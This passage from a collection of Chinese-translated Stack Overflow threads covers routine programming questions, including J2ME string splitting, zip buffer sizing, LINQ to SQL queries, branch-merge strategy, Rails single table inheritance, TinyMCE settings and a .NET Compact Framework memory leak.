
      <Publish Dialog="ExitDialog" Control="Finish" Event="EndDialog" Value="Return" Order="999">1</Publish>
      <Publish Dialog="WelcomeDlg" Control="Next" Event="EndDialog" Value="Return" Order="2"></Publish>

    </UI>
    <UIRef Id="WixUI_Common" />
  </Product>

    <Fragment>
        <Directory Id="TARGETDIR" Name="SourceDir">
            <Directory Id="ProgramFilesFolder">
        <Directory Id="COMPANYFOLDER" Name="test-wixinstall">
          <Directory Id="INSTALLFOLDER" Name="testwixsetup" />
        </Directory>
            </Directory>
        </Directory>
    </Fragment>

    <Fragment>
        <ComponentGroup Id="ProductComponents" Directory="INSTALLFOLDER">
                <Component Id="ProductComponent" Guid="*">
          <File Name="test.py"/>
          <File Name="test.txt"/>
             </Component>
        </ComponentGroup>
    </Fragment>

</Wix> 
```

# java - 如何在 J2ME 中拆分字符串？

> ID：200746
> 
> 赞同：14
> 
> 时间：2008-10-14T11:12:04.570
> 
> 标签：java, algorithm, string, java-me

如何在 J2ME 中有效地拆分字符串？

标准版 (J2SE) 中有[`StringTokenizer`](http://download.oracle.com/javase/1.4.2/docs/api/java/util/StringTokenizer.html)or [`String.split(String regex)`](http://download.oracle.com/javase/1.5.0/docs/api/java/lang/String.html#split%28java.lang.String%29)，但微型版 (J2ME, MIDP) 中没有。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2008-10-14T11:57:42.933

J2ME 有一些 StringTokenizer 类的实现。[Ostermiller](http://ostermiller.org/utils/StringTokenizer.html)的这个很可能包含您需要的功能

有关一些修改和以下示例，另请参见[Mobile Programming Pit Stop 上的此页面：](https://web.archive.org/web/20120206073031/http://mobilepit.com:80/09/using-stringtokenizer-in-j2me-javame-applications.html)

```
String firstToken;
StringTokenizer tok;

tok = new StringTokenizer("some|random|data","|");
firstToken= tok.nextToken(); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-10-14T11:16:52.127

没有内置的方法来拆分字符串。`String.indexOf()`您必须使用and自己编写 `String.substring()`。不难。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2008-10-14T11:51:58.513

String.split(...) 在 J2SE 中可用，但在 J2ME 中不可用。
您需要编写自己的算法：[带有示例解决方案的相关帖子](http://forums.sun.com/thread.jspa?threadID=721672)。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2010-07-27T12:42:24.037

我希望这个对你有所帮助......这是我在我的应用程序中使用的我自己的实现。当然，这仍然可以优化。我只是没有时间去做......而且，我正在这里处理 StringBuffer 。只需将其重构为能够使用 String 代替。

```
public static String[] split(StringBuffer sb, String splitter){
    String[] strs = new String[sb.length()];
    int splitterLength = splitter.length();
    int initialIndex = 0;
    int indexOfSplitter = indexOf(sb, splitter, initialIndex);
    int count = 0;
    if(-1==indexOfSplitter) return new String[]{sb.toString()};
    while(-1!=indexOfSplitter){
        char[] chars = new char[indexOfSplitter-initialIndex];
        sb.getChars(initialIndex, indexOfSplitter, chars, 0);
        initialIndex = indexOfSplitter+splitterLength;
        indexOfSplitter = indexOf(sb, splitter, indexOfSplitter+1);
        strs[count] = new String(chars);
        count++;
    }
    // get the remaining chars.
    if(initialIndex+splitterLength<=sb.length()){
        char[] chars = new char[sb.length()-initialIndex];
        sb.getChars(initialIndex, sb.length(), chars, 0);
        strs[count] = new String(chars);
        count++;
    }
    String[] result = new String[count];
    for(int i = 0; i<count; i++){
        result[i] = strs[i];
    }
    return result;
}

public static int indexOf(StringBuffer sb, String str, int start){
    int index = -1;
    if((start>=sb.length() || start<-1) || str.length()<=0) return index;
    char[] tofind = str.toCharArray();
    outer: for(;start<sb.length(); start++){
        char c = sb.charAt(start);
        if(c==tofind[0]){
            if(1==tofind.length) return start;
            inner: for(int i = 1; i<tofind.length;i++){ // start on the 2nd character
                char find = tofind[i];
                int currentSourceIndex = start+i;
                if(currentSourceIndex<sb.length()){
                    char source = sb.charAt(start+i);
                    if(find==source){
                        if(i==tofind.length-1){
                            return start;
                        }
                        continue inner;
                    } else {
                        start++;
                        continue outer;
                    }
                } else {
                    return -1;
                }

            }
        }
    }
    return index;
} 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-10-14T11:35:39.187

这取决于您到底想要实现什么，但函数 String.substring() 将在某处：

```
String myString = "Hello World"; 
```

这将打印从索引 6 开始到字符串末尾的子字符串：

```
System.out.println(myString.substring(6)); 
```

这将打印从索引 0 到索引 5 的子字符串：

```
System.out.println(myString.substring(0,5)); 
```

以上所有代码的输出：

```
世界
你好

```

将此与其他 String 函数（`indexOf()`. 等）结合起来以达到预期的效果！

重新阅读您的问题，看起来您可能一直在寻找`String.split()`. 这将根据给定的正则表达式将您的输入字符串拆分为字符串数组：

```
String myString = "Hi-There-Gang";

String[] splitStrings = myString.split("-"); 
```

这将导致 splitStrings 数组包含三个字符串`"Hi"`、`"There"`和`"Gang"`。

再次阅读您的问题，`String.split`在 J2ME 中不可用，但可以使用`substring`和实现相同的效果`indexOf`。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-09-25T08:47:53.180

```
public static Vector splitDelimiter(String text, char delimiter) {
    Vector splittedString = null;
    String text1 = "";

    if (text != null) {
        splittedString = new Vector();
        for (int i = 0; i < text.length(); i++) {
            if (text.charAt(i) == delimiter) {
                splittedString.addElement(text1);
                text1 = "";
            } else {
                text1 += text.charAt(i);
                // if(i==text.length()-1){
                // splittedString.addElement(text1);
                // }
            }
        }
        splittedString.addElement(text1);
    }
    return s
     } 
```

您可以使用此方法拆分分隔符。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2013-09-29T17:10:54.927

在 J2ME 中没有拆分，但您可以使用此代码进行拆分。此代码仅使用 1 个 simbol 分隔符！！！使用 NetBeans.File\Create Project\Java ME\MobileApplication\Set project name(split)\Set checkmark.Delete all code in your (Midlet.java).Copy this code and past in your (Midlet.java).

```
//IDE NetBeans 7.3.1
//author: UserSuperPupsik 
//email: usersuperpupsik@gmail.com

package split;

import javax.microedition.lcdui.*;
import javax.microedition.midlet.*;
import java.util.Vector;

public class Midlet extends MIDlet {
 public String e1;
    public Vector v=new Vector();
 public int ma;
 int IsD=0;
 int vax=0;
 public String out[];
 private Form f;

 public void split0(String text,String delimiter){
                            if (text!=""){
                            IsD=0;

                            int raz=0;

                            //v.removeAllElements();
                            v.setSize(0);
                            int io;
                            String temp=""; 
                             int ni=(text.length()-1);

                             for(io=0;io<=ni;io++){

                                    char ch=text.charAt(io);
                                    String st=""+ch;                                    
                                    if(io==0 && st.equals(delimiter)){IsD=1;}

                                    if(!st.equals(delimiter)){temp=temp+st;} //Not equals (!=)
                                    else if(st.equals(delimiter)&&temp!="")//equals (==)
                                                                {
                                    IsD=1;
                                    //f.append(temp);   
                                    v.addElement(temp);
                                    temp="";                   

                                                                 }

                                     if(io==ni && temp!="") {
                                              v.addElement(temp);
                                              temp="";  
                                              }           

                                     if((io==ni)&&IsD==0&&temp!=""){v.addElement(temp);}

                                            }

                                       if(v.size()!=0){

                                       ma=(v.size());

                                       out=new String[ma];

                                       v.copyInto(out);

                                       }
                                       //else if(v.size()==0){IsD=1; }

                            }
                                 }

public void method1(){
    f.append("\n");
    f.append("IsD: " +IsD+"");
    if (v.size()!=0){
    for( vax=0;vax<=ma-1;vax++){
                                f.append("\n");

                                f.append(out[vax]);

                                    }
                          }  
}
    public void startApp() {

    f=new Form("Hello J2ME!");
    Display.getDisplay(this).setCurrent(f);

    f.append("");
    split0("Hello.World.Good...Luck.end" , ".");
    method1();

    split0(".",".");
    method1();

    split0("   First WORD2 Word3 "," ");
    method1();

    split0("...",".");
    method1();            
                                                }

    public void pauseApp() {
    }

    public void destroyApp(boolean unconditional) {
    }

} 
```

位于名为 (out) 的数组中的拆分元素。例如 out[1]:Hello。祝你好运！！！

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2014-08-19T10:58:22.183

另一种替代解决方案：

```
 public static Vector split(String stringToSplit, String separator){
     if(stringToSplit.length<1){
         return null;
     }

     Vector stringsFound = new Vector();

     String remainingString = stringToSplit;

     while(remainingString.length()>0){
         int separatorStartingIndex = remainingString.indexOf(separator);

         if(separatorStartingIndex==-1){
             // Not separators found in the remaining String. Get substring and finish
             stringsFound.addElement(remainingString);
             break;
         }

         else{
             // The separator is at the beginning of the String,
             // Push the beginning at the end of separator and continue
             if(remainingString.startsWith(separator)){
                 remainingString = remainingString.substring(separator.length());
             }
             // The separator is present and is not the beginning, add substring and continue
             else{
                 stringsFound.addElement(remainingString.substring(0, separatorStartingIndex));
                 remainingString = remainingString.substring(separatorStartingIndex + separator.length());
             }
         }
     }

     return stringsFound;
 } 
```

# java - 使用 Java 创建 .zip 存档的缓冲区大小是多少？

> ID：200752
> 
> 赞同：7
> 
> 时间：2008-10-14T11:14:45.997
> 
> 标签：java, zip, buffer

我使用此代码创建一个带有文件列表的 .zip：

```
ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile));

for (int i=0;i<srcFiles.length;i++){
    String fileName=srcFiles[i].getName();
    ZipEntry zipEntry = new ZipEntry(fileName);
    zos.putNextEntry(zipEntry);
    InputStream fis = new FileInputStream(srcFiles[i]);
    int read;
    for(byte[] buffer=new byte[1024];(read=fis.read(buffer))>0;){
        zos.write(buffer,0,read);
    }
    fis.close();
    zos.closeEntry();
}
zos.close(); 
```

我不知道 zip 算法和 ZipOutputStream 是如何工作的，如果它在我读取所有数据并将其发送到“zos”之前写了一些东西，那么结果文件的字节大小可能与我选择另一个缓冲区大小不同。

换句话说，我不知道算法是否像：

读取数据-->处理数据-->创建.ZIP

或者

读取数据块-->处理数据块-->在 .ZIP 中写入块-->| ^------------------------------------------------- -------------------------------------------------- --------------------------

如果是这种情况，最好的缓冲区大小是多少？

更新：

我已经测试了这段代码，将缓冲区大小从 1024 更改为 64，并压缩相同的文件：1024 字节的 80 KB 结果文件比 64 字节缓冲区小 3 个字节。在最快的时间内生成最小的 .zip 的最佳缓冲区大小是多少？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2008-10-14T14:22:23.060

简短的回答：我会选择像 16k 这样的东西。

* * *

长答案：

ZIP 使用 DEFLATE 算法进行压缩 ( [http://en.wikipedia.org/wiki/DEFLATE](http://en.wikipedia.org/wiki/DEFLATE) )。Deflate 是 Ziv Lempel Welch 的一种风格（在维基百科中搜索 LZW）。DEFLATE 使用 LZ77 和 Huffman 编码。

这是一种字典压缩，据我所知，从算法的角度来看，将数据送入 deflater 时使用的缓冲区大小几乎没有影响。LZ77 的最大影响是字典大小和滑动窗口，在您的示例中不受缓冲区大小的控制。

我认为您可以根据需要尝试不同的缓冲区大小并绘制图表，但我相信您不会看到压缩比有任何显着变化（3/80000 = 0.00375%）。

由于调用 FileInputStream.read 和 zos.write 时执行的开销代码量，缓冲区大小对速度的影响最大。从这个角度来看，您应该考虑您获得的和花费的。

当从 1 字节增加到 1024 字节时，您会损失 1023 字节（理论上），并且在 .read 和 .write 方法中的开销时间减少了约 1024 倍。但是，当从 1k 增加到 64k 时，您将花费 63k，从而将开销减少了 64 倍。

所以这会带来收益递减，因此我会选择中间的某个地方（比如说 16k）并坚持下去。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-14T13:08:45.893

取决于您拥有的硬件（磁盘速度和文件搜索时间）。我想说，如果您对压缩性能的最后一滴不感兴趣，请选择 4k 到 64k 之间的任何大小。由于它是一个短暂的对象，无论如何它都会很快被收集。

# linq - LINQ2SQL 中的 EntitySet 与表查询性能

> ID：200755
> 
> 赞同：9
> 
> 时间：2008-10-14T11:16:03.250
> 
> 标签：linq, linq-to-sql, ienumerable, iqueryable

在 LINQ to SQL 类中，为什么从实现的外键`EntitySet`对象创建的属性`IEnumerable`，其中的对象`DataContext`是`Table`实现的对象`IQueryable`？

**编辑：**为了澄清，这里有一个例子说明了我想要理解的内容。这个例子：

```
ctx.Matches.Where(x => x.MatchID == 1).Single()
           .MatchPlayers.Max(x => x.Score); 
```

两次访问数据库，其中：

```
ctx.MatchPlayers.Where(x => x.MatchID == 1)
                .Max(x => x.Score); 
```

只运行 1 个查询。以下是痕迹：

```
exec sp_executesql N'SELECT [t0].[MatchID], [t0].[Date]
FROM [dbo].[Matches] AS [t0]
WHERE [t0].[MatchID] = @p0',N'@p0 int',@p0=1
go
exec sp_executesql N'SELECT [t0].[MatchID], [t0].[PlayerID], [t0].[Score]
FROM [dbo].[MatchPlayers] AS [t0]
WHERE [t0].[MatchID] = @p0',N'@p0 int',@p0=1
go 
```

和

```
exec sp_executesql N'SELECT MAX([t0].[Score]) AS [value]
FROM [dbo].[MatchPlayers] AS [t0]
WHERE [t0].[MatchID] = @p0',N'@p0 int',@p0=1
go 
```

这也表明，更糟糕的是，最大值是在 C# 级别而不是在数据库中完成的。

`IQueryable`我知道发生这种情况的原因是s和s之间的差异`IEnumerable`，那么为什么`MatchPlayers`第一个示例中的对象没有实现`IQueryable`接口以获得与后一个示例相同的好处。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-14T15:32:50.797

```
ctx.Matches.Where(x => x.MatchID == 1).Single() 
```

Single() 返回一个匹配，而不是一个 IQueryable(Match)。

只需将 Single() 推到最后一步：

```
ctx.Matches
  .Where(m => m.MatchID == 1)
  .Select(m => m.MatchPlayers.Max(mp => mp.Score))
  .Single(); 
```

此查询显示的是，可以在查询中使用 MatchPlayers 属性。这解决了我对提问者问题的解释 - “为什么我不能在查询中使用 EntitySet？”，你可以。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-14T11:29:21.243

表实际上是一个概念问题——它们确实存在于服务器上，因此您需要查询以获取条目。外键条目是另一个查询实际获取的条目，因此此时它们在本地可用。这是一个相当模糊的描述，但希望它能超越一般概念。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-24T18:49:36.220

这已[在 MSDN 论坛上得到解决](http://social.msdn.microsoft.com/forums/en-US/linqprojectgeneral/thread/121ec4e8-ce40-49e0-b715-75a5bd0063dc/ "为什么 EntitySet 不再实现 IQueryable？")。推理的要点是，在对数据库进行查询时很难跟踪添加和删除的对象。相反，EntitySet 是您可以操作的相关对象的本地副本。不幸的是，正如您所注意到的，这具有将表达式转移到 LINQ to Objects 调用而不是性能更好的 LINQ to SQL 的副作用。

# version-control - 您如何处理重构和合并需求之间的紧张关系？

> ID：200757
> 
> 赞同：26
> 
> 时间：2008-10-14T11:16:20.923
> 
> 标签：version-control, refactoring, release, branch, merge

我们在交付新版本时的政策是在我们的 VCS 中创建一个分支并将其处理给我们的 QA 团队。当后者开绿灯时，我们标记并发布我们的产品。该分支会保留（仅）接收错误修复，以便我们可以创建技术版本。这些错误修复随后被合并到主干上。

在此期间，主干看到主要的开发工作，并且可能会受到重构更改的影响。

问题是需要有一个稳定的主干（以便错误修复的合并成功 - 如果代码已被提取到另一个方法或移动到另一个类，通常不能）和在引入新功能时需要对其进行重构。

我们的策略是在足够的时间过去并且分支足够稳定之前不进行任何重构。在这种情况下，可以开始在主干上进行重构更改，并且在主干和分支上手动提交错误修复。

但这意味着开发人员必须等待相当长的时间才能在主干上提交任何重构更改，因为这可能会破坏从分支到主干的后续合并。不得不手动将错误从分支移植到主干是很痛苦的。在我看来，这阻碍了发展......

你如何处理这种压力？

谢谢。

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2008-10-14T11:25:42.077

这是一个真正的实际问题。如果您有多个版本需要支持并为每个版本分支，情况会变得更糟。如果您也有真正的研发部门，那就更糟了。

我的偏好是让主干线以正常速度继续运行，而不是坚持下去，因为在一个发布时间在商业上很重要的环境中，我永远无法争论我们应该让代码稳定的情况（“什么，你的意思是你以不稳定的状态释放它？”）。

关键是要确保为 bug 修复创建的单元测试在 bug 迁移到主分支时被转换。如果您的新代码更改真的只是重构，那么旧测试应该同样有效。如果您的更改不再有效，那么无论如何您都不能只移植您的修复程序，您需要让某人认真考虑新代码流中的修复程序。

在处理此类问题多年后，我得出结论，您可能至少需要 4 个代码流来提供适当的支持和覆盖，以及一组非常严格的流程来管理它们之间的代码。这有点像能够以 4 种颜色绘制任何地图的问题。

我从来没有找到任何关于这个主题的真正好的文献。它将不可避免地与您的发布策略以及您与客户签署的 SLA 相关联。

附录：我还应该提到，有必要将分支合并作为特定里程碑写入主分支的发布时间表。如果您有一群辛勤工作的开发人员正在执行他们的工作来实现功能，请不要低估将您的分支整合在一起可能需要的工作量。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-02-24T21:19:27.327

在我工作的地方，我们为每个重要的更改（功能添加或错误修复）创建临时的、短暂的（不到一天 - 几周）工作分支。主干是稳定的，并且（理想情况下）可能一直都可以释放；只有*完成的*项目才会合并到其中。每天从主干提交的所有内容都会合并到工作分支中；这可以很大程度上自动化（我们使用 Hudson、Ant 和 Subversion）。（最后一点，因为通常最好尽早解决任何冲突，当然。）

我们使用的当前模型很大程度上受到Henrik Kniberg的一篇优秀文章（[我之前插入过）的影响：](https://stackoverflow.com/questions/316461/what-are-the-best-programming-articles/475164#475164)**[多个敏捷团队的版本控制](http://www.infoq.com/articles/agile-version-control)**。

（在我们的例子中，我们有两个 Scrum 团队在一个代码库上工作，但我开始认为这种模型即使是一个团队也可能是有益的。）

额外的分支和合并有一些开销，但不会太多，真的，一旦你习惯了它并且使用工具变得更好（例如`svn merge --reintegrate`很方便）。不，我并不总是创建临时分支，例如用于较小的、低风险的重构（与当前正在工作的主要项目无关），只需一次提交到主干即可轻松完成。

我们还维护一个较旧的发布分支，其中不时修复关键错误。诚然，如果代码的某些特定部分在主干中与分支相比有了显着的发展，则可能需要手动（有时是乏味的）合并工作。（随着我们不断地从主干（内部）发布增量，并让营销和产品管理部门决定何时进行外部发布，这有望成为一个不那么重要的问题。）

我不确定这是否直接回答了您的问题，或者您是否可以在您的环境中应用它（与单独的 QA 团队和所有人一起） - 但至少我可以说您所描述的紧张局势对我们来说并不存在，我们是随时免费重构。祝你好运！

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2010-05-20T08:35:54.933

也许 Git（或其他 DVCS）更擅长处理更新代码的合并，这要归功于它们（真正）管理更改而不只是比较文件......正如[Joel 所说](http://www.joelonsoftware.com/items/2010/03/17.html)：

> 使用分布式版本控制，合并很容易并且工作正常。因此，您实际上可以拥有一个稳定的分支和一个开发分支，或者为您的 QA 团队创建长期存在的分支，他们在部署之前对其进行测试，或者您可以创建短期分支来尝试新想法并查看它们是如何工作的。

不过还没试过。。。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-14T11:28:45.160

在我工作的地方，我们继续在主分支中进行重构。如果合并变得棘手，它们只需要临时处理，它们都是可行的，但偶尔需要一些时间。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-22T15:40:32.620

也许我们的问题来自这样一个事实，即我们的分支必须具有相当长的寿命（长达 18 个月），并且必须针对它们进行许多修复。

确保我们只从极其稳定的代码分支可能会有所帮助，但不会那么容易...... :(

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-02-23T22:43:48.023

我认为可以通过在您的开发过程中添加以下成分来处理紧张局势：

1.  持续集成
2.  自动化功能测试（我想你已经算过单元测试了）
3.  自动交付

通过持续集成，每次提交都意味着一个构建，所有单元测试都会在其中执行，如果出现任何问题，您都会感到震惊。你开始更多地使用 head 并且你不太容易分支代码库。

通过自动化功能测试，您可以通过单击按钮来测试您的应用程序。通常，由于这些测试需要更多时间，因此每晚运行一次。有了这个，版本控制的经典角色开始失去重要性。您不会根据版本及其成熟度来决定何时发布，更多的是业务决策。如果您已经实施了单元和功能测试并且您的团队正在提交经过测试的代码，那么 head 应该始终处于可以发布的状态。不断地发现、修复和发布错误，但这不再是循环过程，而是持续的过程。

您可能会有两种类型的批评者，因为这意味着要改变一些根深蒂固的做法。首先，持续交付的范式转变对管理者来说似乎是违反直觉的。“我们不是冒着发布重大漏洞的风险吗？” 如果你看看 Linux 或 Windows 发行版，这正是他们正在做的事情：向客户推送版本。而且，由于您使用了一套自动化测试，因此风险会进一步降低。

接下来，QA 团队或部门。（有些人会争辩说问题在于它们本身的存在！）他们通常会厌恶自动化测试。这意味着学习新的，有时是复杂的工具。在这里，最好的做法是通过实践来宣讲。我们的开发团队开始致力于持续集成，同时使用[Selenium](http://seleniumhq.org/)编写功能测试套件。当 QA 团队看到该工具在运行时，很难反对它的实施。

最后，thurth 是我描述的过程并不像在您的开发过程中添加 3 个成分那么简单。这意味着您开发软件的方式将发生深刻变化。

# ruby-on-rails - 单表继承

> ID：200765
> 
> 赞同：4
> 
> 时间：2008-10-14T11:20:04.037
> 
> 标签：ruby-on-rails, database-design, single-table-inheritance

[对我的一个关于数据库设计的问题的](https://stackoverflow.com/questions/200394/one-table-or-many)回答提出了一种叫做单表继承的东西。我已经对此进行了一些搜索，但似乎无法找到有关它的清晰信息。

基本上我似乎从中了解到的是，您有一个包含所有字段的大表以及一个类型字段 - 然后您的 ORM 层使用类型字段为您提供不同的对象视图。那是对的吗？

更重要的是，单表继承是一种“认可”的数据库设计技术吗？我的意思是使用它是否“明智”？使用它也安全吗，还是会引起问题？

另一个问题是这在 Rails 中的效果如何？我从 Rails 中找到了一些对它的引用——但它是否会因为以非常规的方式做事而导致问题？

非常感谢任何帮助。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-10-14T11:39:23.890

这是个好主意吗 ？这取决于。它打破了规范化，因为表没有单一用途。当您第 n 次扩展基类时会发生什么？您将不得不向表中添加列。大多数现代数据库对此没有问题，因为您可以修改表，但是重构和删除类呢。现在您有了没有目的的列。

一条经验法则——如果大部分设计都已经完成，那么使用起来可能是安全的。如果设计经常更改 - 您还有其他问题，您需要锁定您的用例/用户需求。（是的，不是真正的 XP 友好）

我不知道 Rails 效果。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-14T11:40:10.923

STI 是一种处理面向对象和面向数据库的思维之间不匹配的方法。它允许数据库内信息的合理表示和对象模型内的不同表示。

例如，我有一个应用程序，其中我的每个产品都包含一个或多个费用，每个费用的计算方式略有不同。在我的对象模型中，我希望有一个 Fee 类的子类，每个子类都知道如何计算自己。不过，我真的不想为每种费用类型创建一个表：所以我将费用创建为基类，并将费用创建为表，其中包含所有子类型所需的所有字段的联合，以及一个“类型”其值对应于相关子类的名称的列。此后 ActiveRecord 处理管道。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-14T23:44:53.083

简而言之，单表继承 (STI) 是一种允许将 OOP 继承关系映射到数据库的设计模式。如果您从 ActiveRecord 模型对象定义任何子类，那么您应该考虑 STI。

STI（最初？）记录在 Martin Fowler 的“企业应用程序架构模式”一书中，并且也在 DHH 的规范 Rails 书“使用 Rails 的敏捷 Web 开发”（我认为是第 18.4 节）中进行了描述。我推荐你参考这些书是因为他们提供了比我希望在这个领域做的更好的解释。

我强烈不同意 www.matthewpaulmoore.com（由 robintw 在此线程中链接）所表达的观点，即 STI 本质上是一件坏事。这似乎是一种有点幼稚的观点，它低估了 OOP 继承的使用。我使用 STI 在 Rails 中创建了一些优雅的解决方案，但我想你可以滥用任何设计模式。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-14T11:24:26.947

权威[参考](http://martinfowler.com/eaaCatalog/singleTableInheritance.html)。它允许单个表存储具有公共基类的多个对象。

Ruby on Rails 使用一个名为[Active Record](http://wiki.rubyonrails.org/rails/pages/ActiveRecord)的库。这是一个支持 STI 的通用 Ruby 框架。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-14T11:58:16.677

我只能从（新的）ADO 实体框架的角度讲，它包括每个类型的表 (TPT) 功能。

[这是一个很好的系列博客文章，介绍了核心概念（使用实体框架），](http://mosesofegypt.net/post/Inheritance-and-Associations-with-Entity-Framework-Part-1.aspx)[这里](http://msdn.microsoft.com/en-us/library/bb738685.aspx)也有一篇关于它的 MSDN 论文。

使用 nHibernate 进行 TPT 时似乎也有一些指导，它位于[此处](http://www.hibernate.org/hib_docs/reference/en/html/inheritance.html)。

有这个链接解释[了 SQL Server 中的 table-per-type 继承](http://www.sqlteam.com/article/implementing-table-inheritance-in-sql-server)。这似乎对概念进行了很好的总结和介绍。

我不确定它会对 Rails 产生什么影响。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-10-14T12:15:56.187

我刚刚看到[http://www.matthewpaulmoore.com/articles/1276-ruby-on-rails-code-quality-checklist#sti](http://www.matthewpaulmoore.com/articles/1276-ruby-on-rails-code-quality-checklist#sti)这表明这是一个坏主意。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-10-21T02:37:16.867

通常我觉得它很有用，但[我遇到了一些错误](https://stackoverflow.com/questions/220584/single-table-inheritance-find-issues)

该链接中的示例可能会为您提供如何使用它的有用图片。

# html - 如何设置 tinyMCE 的格式？

> ID：200774
> 
> 赞同：1
> 
> 时间：2008-10-14T11:24:22.843
> 
> 标签：html, text, format, tinymce

我正在使用所见即所得的编辑器 TinyMCE，并且我已经剥离了大部分功能以创建一个更简单的版本。但是，我还需要使格式尽可能基本，例如，我需要使用 <br /> 标签代替 <p> 标签。另外，我希望它不要转换 ' in ’ 因为我将在 Flash 中使用输出。

剩下的唯一编辑工具是粗体、斜体、下划线和链接/取消链接。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-14T14:23:07.833

[您可以通过配置选项force_br_newlines](http://wiki.moxiecode.com/index.php/TinyMCE:Configuration/entity_encoding)强制使用 <br> ，并且可以使用配置选项[entity_encoding](http://wiki.moxiecode.com/index.php/TinyMCE:Configuration/force_br_newlines)定义编码。

```
entity_encoding: "raw"
force_br_newlines: true, 
```

# c# - 使用 Linq 和 SQL 时如何防止向表中插入新记录？

> ID：200785
> 
> 赞同：2
> 
> 时间：2008-10-14T11:30:03.317
> 
> 标签：c#, sql-server, linq

当创建一个映射到我的一个 SQL Server 表的新对象时，LINQ 在我调用 SubmitChanges 时将一条新记录插入到表中。我想阻止这种情况，但仍然需要我的新对象。

我知道自定义方法，但无论如何都可以禁用此行为，以便它只更新现有记录并且从不插入新记录，无论我是否调用过`MyTableClass myObject = new MyTableClass()`。

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-14T11:38:46.153

您总是可以创建一个不做任何事情的存储过程并将其分配给插入角色 - 这是一个真正的黑客，但它会完成工作！

我会建议，这个问题出现的事实可能表明您在引用该对象时所采用的方法有问题 - 究竟是什么需要使用这个新对象？

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-14T11:39:44.170

如果您希望您的数据上下文在插入时出现问题，您可以执行以下操作：

```
partial class DataClasses1DataContext
{
    public override void SubmitChanges(System.Data.Linq.ConflictMode failureMode)
    {
        if(GetChangeSet().Inserts.OfType<MyObject>().Any())
        {
            throw new InvalidOperationException("No inserts!");
        }
        base.SubmitChanges(failureMode);
    }
} 
```

有什么好处吗？

[是：您能否简单地将其添加为“干净” - 即 Attach(obj, false);

如果您不希望模型中的对象，为什么将其添加到数据上下文中？]

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-14T11:31:18.273

你不能在服务器端阻止它吗？作为没有插入访问权限的角色连接。我怀疑，迟早，这将是防止插入的最防弹的方法。

# .net - .NETCF 中的内存泄漏 - 创建动态控件？

> ID：200786
> 
> 赞同：1
> 
> 时间：2008-10-14T11:30:28.540
> 
> 标签：.net, compact-framework, memory-leaks, garbage-collection, profiling

我在 .NET CF 应用程序中遇到内存泄漏问题。

使用[RPM](http://blogs.msdn.com/stevenpr/archive/2006/04/17/577636.aspx)我发现动态创建控件不会像预期的那样被垃圾收集。在 .NET 窗口窗体中运行同一段代码的行为会有所不同，并且会按我的预期处理控件。

通过 PerfMon 查看 RPM 的输出以了解***进程堆***计数器：
![替代文字](https://i462.photobucket.com/albums/qq346/pfourie/ScreenShot191.jpg)

GC 堆：
![替代文字](https://i462.photobucket.com/albums/qq346/pfourie/ScreenShot190a.jpg)

我最好的猜测是，对面板的弱引用是由于某种未知的原因导致对象没有资格进行 GC，可以吗？

**请注意：**尽管**Dispose()**解决了示例的问题，但我无法轻松地将其合并到现有应用程序中，因为它无法明确确定对象何时不再使用。

我已经包含了一个简化版本的源代码来说明这个问题：

```
using System;
using System.Windows.Forms;

namespace CFMemTest
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        // Calling this event handler multiple times causes the memory leak
        private void Button1_Click(object sender, EventArgs e)
        {
            Panel uc = new Panel();
            // Calling uc.Dispose() cleans up the object 
        }
    }
} 
```

**更新：**
1\. 调用 GC.Collect() 也不会导致面板被清理。
2\. 在 Windows CE 4.2 设备上使用 .NET CF 2.0 SP1。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-15T07:29:00.663

这里的一些附加信息解释了这种行为。

[根据 Ilya Tumanov 的说法](http://forums.microsoft.com/msdn/ShowPost.aspx?PostID=4002811&SiteID=1&mode=1)：

> **所有与 NETCF 相关的 UI 都被有意地从 GC 范围中删除，因此它永远不会被收集**。此行为与桌面不同，在 NETCF V3.5 中已更改（除非在兼容模式下运行）。
> 
> 之所以如此不同，是因为 NETCF 上的托管 UI 类与桌面完全不同。它们是实现可接受性能所需的原生实现的瘦包装器。
> 
> 我不确定是否有这样的资源。但实际上，您需要知道的是：它永远不会被收集，必须调用 dispose。你实际上也应该在桌面上这样做，但如果你不这样做，那就更宽容了。NETCF 并非如此。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-14T20:33:26.400

窗体不会自动释放在其代码中创建的所有控件，因为它无法知道它的存在。要让 Form to Form 在 Disposed 时自动 Dispose，您需要将其添加到 Controls 集合中。

